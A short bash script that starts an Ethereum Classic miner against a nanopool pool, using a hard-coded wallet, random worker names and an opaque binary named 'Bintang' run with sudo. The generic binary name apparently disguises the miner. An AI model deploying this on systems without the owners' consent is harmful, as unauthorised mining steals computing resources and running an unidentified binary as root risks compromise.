#!/bin/bash

POOL=etc-eu1.nanopool.org:19999
WALLET=0xf3ffd073e16a2c69a6343d30e1d4d4e334133b9e.$(echo $(shuf -i 1000-9999 -n 1)-MJ-)
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-MJ-)

cd "$(dirname "$0")"

chmod +x ./Bintang && sudo ./Bintang -a etchash -o $POOL -u $WALLET.$WORKER $@
